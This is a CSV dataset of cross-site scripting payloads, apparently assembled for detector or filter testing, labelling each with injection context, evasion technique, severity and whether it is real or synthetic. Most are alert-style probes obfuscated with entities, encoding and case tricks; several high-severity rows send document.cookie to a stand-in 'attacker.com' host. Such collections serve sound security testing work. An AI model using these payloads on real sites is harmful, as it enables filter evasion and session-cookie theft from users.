payload,context,technique,severity,length,source
${&#97;l&#101;rt(1)|n},template_injection,synthetic,low,22,synthetic
<script>//consol&#101;.log(1)</script>,script_injection,synthetic,low,38,synthetic
""" onfocus=prompt(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape,synthetic,high,59,synthetic
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,tag_injection,none,medium,77,real
"<bgsound onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",tag_injection,none,medium,69,real
<svg onb&#101;for&#101;copy=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,61,synthetic
"%27 ><svg onerror=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
"<colgroup draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",tag_injection,none,medium,94,real
`><img src=x onmousewheel=alert(document.domain)>,attribute_escape,synthetic,medium,49,synthetic
%3C!--%3E%3Ctd onend=console.log(document.domain)%3E,tag_injection,synthetic,medium,52,synthetic
�scriptualert(EAnonKryptiQuzE)�/scriptu,generic,none,medium,39,real
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,tag_injection,none,medium,44,real
"%3Cscript
%3Econfirm(document.domain)%3C/script%3E",script_injection,synthetic,medium,50,synthetic
%27 ><svg onmozfullscreenchange=alert(1)>,attribute_escape,synthetic,medium,41,synthetic
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",script_injection,none,medium,59,real
&quot; onpause=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
'%3E%3Cimg src=x ongestureend=prompt(document.domain)%3E,attribute_escape,synthetic,medium,56,synthetic
""" ><svG oNpaGehIde=alErt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,42,synthetic
"<animate onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animate>",tag_injection,none,medium,87,real
\' ondblclick=console.log(location.hash)//,attribute_escape,synthetic,medium,42,synthetic
"<base ondblclick=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,48,real
&quOt; onPlaY=cOnfIrm('XSS') x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
"\"" OnbEfoRepAstE=cOnsOle.loG('XSS')//",attribute_escape,synthetic,medium,37,synthetic
"j&#97;v&#97;
script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh)",js_uri,synthetic,low,57,synthetic
"' %3E%3Csvg onbeforepaste=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,66,synthetic
{{#with &#97;l&#101;rt('XSS')}}...{{/with}},template_injection,synthetic,low,43,synthetic
"&quot; onpoint&#101;rr&#97;wupd&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,medium,100,synthetic
"<rp onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rp>",tag_injection,none,medium,79,real
&quot; ontouchend=\u0061lert('XSS') x=&quot;,attribute_escape,synthetic,low,44,synthetic
%3Cscript%3Ewindow['prompt'](document.domain)%3C/script%3E,script_injection,synthetic,low,58,synthetic
"<strike id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></strike>",tag_injection,none,medium,88,real
`><img src=x ontouchmove=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,44,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;us&#101;"":consol&#101;.log})",dom_sink,synthetic,low,68,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>"")",dom_sink,synthetic,high,236,synthetic
<dfn onpointerover=alert(1) style=display:block>AnonKryptiQuz</dfn>,tag_injection,none,medium,67,real
<dl onpointerup=alert(1) style=display:block>AnonKryptiQuz</dl>,tag_injection,none,medium,63,real
<body oninvalid=\u0061lert(location.hash)>,tag_injection,synthetic,low,42,synthetic
"<slot id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></slot>",tag_injection,none,medium,84,real
<imAge onChaNge=alErt(1)/>,tag_injection,synthetic,medium,26,synthetic
%27><img src=x oncopy=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
%27 ><svg oninput=console.log(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,tag_injection,none,medium,76,real
'><Img srC=x onGotPoiNteRcaPtuRe=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,62,synthetic
"SetTimEouT(""ProMpt('XSS')"",0)",dom_sink,synthetic,medium,29,synthetic
javascr	ipt:%0aprompt(location.hash),js_uri,synthetic,medium,36,synthetic
<sCript>confirm()</sCript>,script_injection,case_variation,medium,26,real
<time onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,44,real
%22 onmouseover=confirm(1) x=%22,attribute_escape,synthetic,medium,32,synthetic
%3Cselect onmousewheel=alert(document.domain)/%3E,tag_injection,synthetic,medium,49,synthetic
"<xmp onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,155,synthetic
"<hgroup onmouseout=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,52,real
	oncontextmenu=confirm(%27XSS%27),event_handler,synthetic,medium,33,synthetic
""" ontouchend=confirm('XSS') """,attribute_escape,synthetic,medium,29,synthetic
<small id=x tabindex=1 onfocusin=alert(1)></small>,tag_injection,none,medium,50,real
<animatetransform onpointerout=alert(1) style=display:block>AnonKryptiQuz</animatetransform>,tag_injection,none,medium,92,real
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,generic,url_encoding,medium,49,real
"<legend onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",tag_injection,none,medium,69,real
""" on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,49,synthetic
"<select onclick=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,69,real
""" onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,78,synthetic
""" oNdrAgeNteR=cOnsOle.loG(1) """,attribute_escape,synthetic,medium,30,synthetic
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",tag_injection,none,medium,107,real
"EleMenT.sEtATtrIbuTe(""onCliCk"",""pRomPt(DocUmeNt.CooKie)"")",dom_sink,synthetic,high,57,synthetic
%3Cform x=y onpagehide=confirm(1)%3E,tag_injection,synthetic,medium,36,synthetic
"<caption onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,89,real
"<nobr oncut=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",tag_injection,none,medium,59,real
`><img src=x onwheel=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"j&#97;v&#97;
script:prompt(docum&#101;nt.dom&#97;in)",js_uri,synthetic,medium,52,synthetic
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationend=""alert(1)""></acronym>",tag_injection,none,medium,99,real
"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;",attribute_escape,encoding,high,84,real
<listing onpointerrawupdate=alert(%27XSS%27)/>,tag_injection,synthetic,medium,46,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.cOokIe)>""",dom_sink,synthetic,high,77,synthetic
"' ><svG oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,56,synthetic
window[%22XMLHttpRequest%22](%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,70,synthetic
"""><img src=x onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,80,synthetic
%3Cform ongesturestart=console.log('XSS')/%3E,tag_injection,synthetic,medium,45,synthetic
<head onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</head><input value=clickme>,tag_injection,none,medium,99,real
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""alErt('//atTacKer.coM/?C='+doCumEnt.coOkiE)""",dom_sink,synthetic,high,87,synthetic
onanimationstart=alert(%27XSS%27),event_handler,synthetic,medium,33,synthetic
"<xss
on&#97;nim&#97;tionst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,82,synthetic
ontransitionstart=prompt/*x*/(location.hash),event_handler,synthetic,low,44,synthetic
j&#97;v&#97;script:%0&#97;confirm(1),js_uri,synthetic,medium,36,synthetic
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,tag_injection,none,medium,50,real
"""><img src=x oninv&#97;lid=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,75,synthetic
`><Img srC=x onPlaY=cOnfIrm(1)>,attribute_escape,synthetic,medium,31,synthetic
' ><svg onwheel=console.log(document.domain)>,attribute_escape,synthetic,medium,45,synthetic
<th onpointermove=alert(1) style=display:block>AnonKryptiQuz</th>,tag_injection,none,medium,65,real
""" ><svg onmous&#101;down=confirm(1)>",attribute_escape,synthetic,medium,36,synthetic
OndRop=jaVasCriPt:ConFirM(dOcuMenT.dOmaIn),event_handler,synthetic,medium,42,synthetic
"<colgroup ondblclick=""alert(1)"">AnonKryptiQuz</colgroup>",tag_injection,none,medium,56,real
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(document.cookie)%22,dom_sink,synthetic,high,83,synthetic
"<xmp
onmousewheel=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
'><img src=x ontouchend=prompt('XSS')>,attribute_escape,synthetic,medium,38,synthetic
""" ><svG oNcaNplAy=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"<!--><xmp onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,85,synthetic
<tr src=x ontouchstart=confirm(location.hash)>,tag_injection,synthetic,medium,46,synthetic
